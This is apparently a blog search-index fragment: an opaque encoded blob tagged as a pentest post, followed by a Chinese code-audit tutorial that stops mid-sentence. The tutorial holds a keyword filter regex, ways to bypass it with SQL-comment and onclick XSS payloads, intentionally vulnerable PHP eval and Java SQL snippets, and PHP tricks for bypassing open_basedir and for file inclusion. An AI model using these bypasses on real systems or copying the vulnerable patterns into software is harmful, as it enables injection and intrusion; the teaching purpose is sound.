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]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>linux</tag>
        <tag>pentest</tag>
        <tag>docker</tag>
        <tag>eternalBlue</tag>
        <tag>doublePulsar</tag>
        <tag>java unserialize</tag>
        <tag>weblogic</tag>
        <tag>jenkins</tag>
        <tag>information gathering</tag>
        <tag>mysql</tag>
        <tag>RFI</tag>
        <tag>LFI</tag>
        <tag>webshpere</tag>
        <tag>port</tag>
        <tag>intranet</tag>
        <tag>domain</tag>
        <tag>sql</tag>
        <tag>xss</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码审计总结]]></title>
    <url>%2F2018%2F02%2F13%2Fcode-audit-summary%2F</url>
    <content type="text"><![CDATA[概述代码审计是企业安全运营以及安全从业者必备的安全基础能力。代码审计在很多时候都需要用到，比如渗透测试、漏洞研究、安全运营等等，它以开放的形式从代码层面寻找漏洞、验证漏洞、修复漏洞。 源代码审计工作利用一定的编程规范和标准，针对应用程序源代码，从结构、脆弱性以及缺陷等方面进行审查，来发现当前应用程序中存在的安全缺陷以及代码的规范性缺陷。 工具 环境搭建(phpstudy) 自动化审计工具 IDE 测试工具(burpsuite、firebug等) 代码编辑器(Sublime、Notepad++、UltraEdit等) 自动化审计工具的分析结果： 事前工作 了解Web应用所采用的编程语言的版本漏洞、语言特性、运行机制。 了解Web应用所采用的框架的结构以及运行流程。 了解Web应用常规的安全漏洞、代码样本以及修复方案。 了解Web应用的类型、编码方式等。 思路在团队工作中，采用标准化的编码方式、注释尤为重要，这样可以提高代码的可读性，降低后期修改代码的难度。对企业应用、CMS进行代码审计也可以充分利用这一点。 在代码审计之前先查看整个代码的目录结构，例如文件的命名、修改时间、大小等。因为根据这些文件的命名我们可以大概知道这个程序实现了哪些功能、核心文件是什么等等。 从上图基本可以看出config目录是配置文件、controllers是控制器、helper是辅助函数、models是模型、view是视图、third_party是第三方组件、language肯定和语言有关等等。 然后再根据通用的思路来进行审计： 查看Web应用所采用的框架、第三方库是否存在安全漏洞。对于Web应用而言，大多是都是采用网上现成的成熟的框架进行开发的，也会经常会调用第三方组件。这个时候我们就要关注它所采用的框架、第三方组件是否存在安全漏洞。 比如Struts、Spring、ThinkPHP、Django等框架的漏洞以及Apache Common Collection等第三方组件的漏洞。 这些可以根据框架/第三方组件的名称、版本来进行查询。 查看公共函数、拦截函数是否存在安全漏洞或者可以绕过的风险。一般情况下，公共函数、拦截函数在文件、函数命名上会包含common、function、filter、safe、check等关键词，然后提供给其他文件统一调用。可以查看此类函数的安全机制是否存在绕过的可能性： Java可查看全局文件web.xml 下面是一个过滤器的函数代码： 12345678910// Javapublic class RequestEncodingFilter implements Filter &#123; ... try&#123; invalidInputPattern = myComplier.complie(&quot;&lt;[\\s\\x00]*SCRIPT|SELECT\\s|INSERT\\s|DELETE\\s|UPDATE\\s|DROP\\s|&lt;!--|--&gt;|&lt;FRAME|&lt;IFRAME|&lt;FRAMESET|&lt;NOFRAME|&lt;PLAINTEXT|&lt;A\\s|&lt;LINK|&lt;MAP|&lt;BGSOUND|&lt;IMG|&lt;FORM|&lt;INPUT|&lt;SELECT|&lt;OPTION|&lt;TEXTAREA|&lt;APPLET|&lt;OBJECT|&lt;EMBED|&lt;NOSCRIPT|&lt;STYLE|ALERT[\\s\\x00]*\\(|&lt;|&gt;|\&quot;&quot;); &#125; catch(Exception err)&#123; invalidInputPattern = null; &#125; ...&#125; 可以看到，如果存在SQL注入漏洞，可用/**/代替空格的方式绕过，例如：SELECT/**/id/**/From/**/table的方式绕过，另外对于标签内利用on事件进行XSS 也没有拦截作用，例如: 1’ onclick=confirm`1` xx=’ 查看敏感函数，回溯变量，判断变量是否在调用前进行过严格的安全过滤。根据敏感函数来逆向追踪参数的传递过程，这是目前来说最为常用的一种方式。因为大多是的漏洞都是因为函数的使用不当或者在函数使用前安全处理不够所造成的。 12345// PHP......$str = @(string)$_GET[&apos;str&apos;];eval(&apos;$str=&quot;&apos;.addslashes($str).&apos;&quot;;&apos;);...... 虽然这里用addslashes()函数进行了过滤，但是提交的php代码可以这样在双引号中被执行： 当然还有一些比如SQL注入等问题可以直接通过搜索select、insert等关键词来进行审计的: 123456// Java......Statement statement = con.createStatement();String sql = &quot;select * from users where id=&apos;&quot; + id + &quot;&apos;&quot;;ResultSet rs = statement.executeQuery(sql);...... 找到关键点后然后一步一步逆向查看关键变量是否可控。 查看敏感功能点，正向追踪变量传递过程。有了一定的渗透、代码审计经验之后，就会知道哪些功能点会存在哪些问题。 例如：PHPCMS任意前台用户密码重置漏洞 基础知识Web框架Web 应用框架，是一种开发框架，主要用来支持动态网站、网络应用程序以及网络服务的开发。 常见的框架如下所示： Java: Struts、SpringPHP: ThinkPHP、CodeIgniter、YiiPython: Django、Tornado Web框架模式: MVC是最常见的开发架构，它强制性的使应用程序的输入、处理和输出分开。使用MVC应用程序被分成三个核心部件：模型、视图、控制器。它们各自处理自己的任务，最典型的MVC就是JSP + servlet + javabean的模式。 框架的安全特质: 拦截器 CSRF防护 SQL注入防护 XSS防护 … 虽然大部分框架都具有一些安全特质，但是毕竟代码还是人写的，开发者如果对框架以及安全了解不足，还是会用自己的编码习惯而不是采用框架提供的安全函数去编写Web应用，那么常规的漏洞还是可能会出现的。 还有一些Web应用可能是自己团队开发的框架，但是八九不离十，还是按照前面提到的思路来。 编码这里特地要提一下统一编码的重要性，前后端的编码不一致会引发诸多的安全问题（php与mysql交互过程中发生的编码转换导致SQL宽字节注入等）。 用户可控变量基于一切输入都是不可信任的原则，要对所有的外来输入都要进行安全过滤、验证。 用户可控变量包括用户所在的客户端能够提交的变量：例如GET、POST、COOKIE、Referer、Content-Type、User-Agent、Host以及X-FORWARDED-FOR、Proxy等等。 1234567891011POST /storage/1.5/499041/storage/tabs?batch=true&amp;commit=true HTTP/1.1Host: xxx.xxx.comUser-Agent: Firefox/54.0.1 (Windows NT 10.0; WOW64) FxSync/1.56.0.20170628075643.desktopAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Content-Type: text/plainConnection: closePragma: no-cacheCache-Control: no-cache[&#123;&quot;payload&quot;:&quot;&#123;\&quot;ciphertext\&quot;:\&quot;JLIhhuoBa4AkbFGxBTSfltZD+xy95wdQzq5nPPxZqWs4bpuYxmG1tmX8GXxd3eGS8U3cf6qilhRwqbnxGyfTwFXLnW8uVjzaHpnijtkIkS6zJltyKCDVUKz/JHiHHcOAJ0SVT2VXsJBjl2LiCDTR+A==\&quot;,\&quot;IV\&quot;:\&quot;nOnwHS0aT7EPa+6CQip9HQ==\&quot;,\&quot;hmac\&quot;:\&quot;33f54d9e80834afecd1e05966c9aafb27ab72b2c8a80e87769bb328f43446229\&quot;&#125;&quot;,&quot;id&quot;:&quot;5FXzEHRBZX2y&quot;,&quot;ttl&quot;:1814400&#125;] 正因为用户可以控制JS，所以所有的安全过滤均要在服务器端完成。 PHP配置文件对于PHP，在代码审计之前需要了解PHP官方配置说明。 这些模式决定着一个 PHP 的指令在何时何地，是否能够被设定。手册中的每个指令都有其所属的模式。例如有些指令可以在 PHP 脚本中用 ini_set() 来设定，而有些则只能在 php.ini 或 httpd.conf 中。 例如 output_buffering 指令是属于 PHP_INI_PERDIR，因而就不能用 ini_set() 来设定。但是 display_errors 指令是属于 PHP_INI_ALL 因而就可以在任何地方被设定，包括 ini_set()。 PHPINI* 模式的定义： 模式 含义 PHP_INI_USER 可在用户脚本（例如 ini_set()）或Windows注册表（自PHP5.3起）以及.user.ini中设定 PHP_INI_PERDIR 可在 php.ini，.htaccess 或 httpd.conf 中设定 PHP_INI_SYSTEM 可在 php.ini 或 httpd.conf 中设定 PHP_INI_ALL 可在任何地方设定 具体可以根据首页文件index.php ,了解程序运作时调用哪些函数和文件 以index.php文件作为标线，一层一层去扩展阅读所包含的文件，了解其功能，之后进入其功能文件夹的首页文件，进扩展阅读。 PHP版本姿势官方版本变更说明 php5.2以前： __autoload加载类文件，但只能调用一次这个函数，所以可以用spl_autoload_register加载类 php5.3: 新增了glob://和phar://流包装glob用来列目录，绕过open_baedirphar在文件包含中可以用来绕过一些后缀的限制 新的全局变量DIR 默认开启&lt;?= $xxoo;?&gt;， 5.4也可用 php5.4: 移除安全模式、魔术引号 register_globals 和 register_long_arrays php.ini 指令被移除。 php.ini新增session.upload_progress.enabled，默认为1，可用来文件包含 php5.5: 废除preg_replace的/e模式(不是移除)当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：’、”、 \ 和 NULL) 然后进行后向引用替换。 php5.6: 使用 … 运算符定义变长参数函数 php7.0: 十六进制字符串不再是认为是数字 移除asp和script php标签1&lt;% %&gt;&lt;%= %&gt;&lt;script language=&quot;php&quot;&gt;&lt;/script&gt; php7.1:1、废除mb_ereg_replace()和mb_eregi_replace()的Eval选项 PHP 其他注意点 php可以解析的文件后缀：php php4 php5 php6 phtml pht phps（部分要配置过） 当.或者[]之类的符号作为参数的key值时，会被php改写为_符号，但是QUERY_STRING为用户提交的内容，所以不能修改 PHP的魔术方法 ….. 变量用户可以直接控制的变量： 123456789101112131415$_GET：http://localhost/mm.php?a=xxxxx$_POST:$_COOKIE: 记录在我们本地浏览器中的变量，是可控的。PHP中还有一个变量$_SESSION。 每个人访问网站，他的phpsessid都是不一样的，这个值就用来区分每个用户。服务器用PHPSESSID=cmebf7jkflu5a31vf67kbiopk4来标示每个用户，是否登录或者是否是管理员。$_FILES: 可能产生的漏洞类型： 01.上传漏洞，上传一个php木马，相当于直接getshell了 02.注入，有些cms会把name的值保存在数据库里，但又没有对name进行过滤。$_SERVER:其中部分我们可以控制。 X-FORWARDED-FOR：IP地址，很多cms取ip是首先取这个变量中的值，如果没有这个变量，才去取我们的真实Ip. Referer：来源地址，我们访问目标页面的来源 Host：目标网址这几个变量就是我们php中间用户可以控制的变量。 大部分的漏洞都是 从这几个变量开始展开的。$_REQUEST 就是$GET/$_POST/$COOKIE 